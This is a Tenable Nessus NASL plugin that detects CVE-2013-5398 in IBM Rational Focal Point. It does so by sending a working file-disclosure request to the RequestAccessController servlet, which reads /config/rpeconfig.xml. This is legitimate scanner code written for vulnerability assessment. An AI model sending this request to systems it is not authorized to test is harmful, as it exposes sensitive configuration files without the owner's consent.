#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(72862);
  script_version("1.7");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2013-5398");
  script_bugtraq_id(64339);

  script_name(english:"IBM Rational Focal Point RequestAccessController Servlet File Disclosure");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a file disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"Nessus was able to exploit a file disclosure vulnerability in the
RequestAccessController serlvet on the remote IBM Focal Point install. 
A remote attacker could leverage this vulnerability to view sensitive
files (such as configuration files).");
  script_set_attribute(attribute:"see_also", value:"https://www.zerodayinitiative.com/advisories/ZDI-13-285/");
  script_set_attribute(attribute:"see_also", value:"http://www-01.ibm.com/support/docview.wss?uid=swg21654471");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch per the referenced vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:A/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2013-5398");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/12/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/12/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/03/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:rational_focal_point");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ibm_rational_focalpoint_login_detect.nbin");
  script_require_keys("www/ibm_rational_focal_point");
  script_require_ports("Services/www", 9080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:9080);

install = get_install_from_kb(
  appname      : "ibm_rational_focal_point",
  port         : port,
  exit_on_fail : TRUE
);

dir = install['dir'];

exploit = dir + "/fp/servlet/RequestAccessController?file=/config/rpeconfig.xml";

res = http_send_recv3(
  port            : port,
  method          : 'GET',
  item            : exploit,
  exit_on_fail    : TRUE
);

if (
  "<?xml" >< res[2] && "<config>" >< res[2] &&
  "IBM Corporation" >< res[2] && '<feature tag="Load">' >< res[2]
)
{
  if (report_verbosity > 0)
  {
    header = 'Nessus was able to verify the vulnerability using the following URL';

    report = get_vuln_report(
      items   : exploit,
      port    : port,
      header  : header
    );

    security_note(port:port, extra:report);
  }
  else security_note(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "IBM Rational Focal Point", build_url(port:port, qs:dir));
